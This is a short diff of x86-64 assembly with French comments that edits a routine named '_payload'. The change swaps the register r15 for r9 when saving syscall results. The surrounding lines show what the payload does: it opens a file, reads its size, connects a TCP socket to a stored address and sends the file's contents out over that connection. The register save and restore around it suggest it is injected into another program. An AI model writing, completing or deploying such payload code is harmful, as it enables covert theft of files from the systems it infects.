@@ -27,7 +27,7 @@ _payload:
     lea rdi, [rel path]		; Chemin du fichier
     mov rsi, 0				; O_RDONLY
     syscall
-	mov r15, rax
+	mov r9, rax
     test rax, rax
     js exit					; Gestion de l'erreur
 
@@ -38,7 +38,7 @@ _payload:
     lea rdi, [rel path]			; Chemin du fichier
     lea rsi, [rel stat_buffer]	; Pointeur vers la structure stat
     syscall
-	mov r15, rax
+	mov r9, rax
     test rax, rax
     js error_open			; Gestion de l'erreur
 
@@ -48,7 +48,7 @@ _payload:
     mov rsi, 1				; SOCK_STREAM
     mov rdx, 0
     syscall
-	mov r15, rax
+	mov r9, rax
     test rax, rax
     js error_open			; Gestion de l'erreur
 
@@ -61,7 +61,7 @@ _payload:
     lea rsi, [rel sockaddr_in]	; Pointeur vers sockaddr_in
     mov rdx, 16					; Taille de sockaddr_in
     syscall
-	mov r15, rax
+	mov r9, rax
     test rax, rax
     js error_socket				; Gestion de l'erreur
 
@@ -72,7 +72,7 @@ _payload:
 	xor rdx, rdx					; offset (NULL)
 	mov r10, [rel stat_buffer + 48]	; size
 	syscall
-	mov r15, rax
+	mov r9, rax
     test rax, rax
     js error_socket					; Gestion de l'erreur
 
@@ -95,7 +95,7 @@ exit:
 	xor rax, rax
 	popx rax, rdi, rsi, rsp, rdx, rcx, r8, r9, r12
 	popfq
-	mov rax, r15
+	mov rax, r9
 	; jmp 0x0
 	ret
 
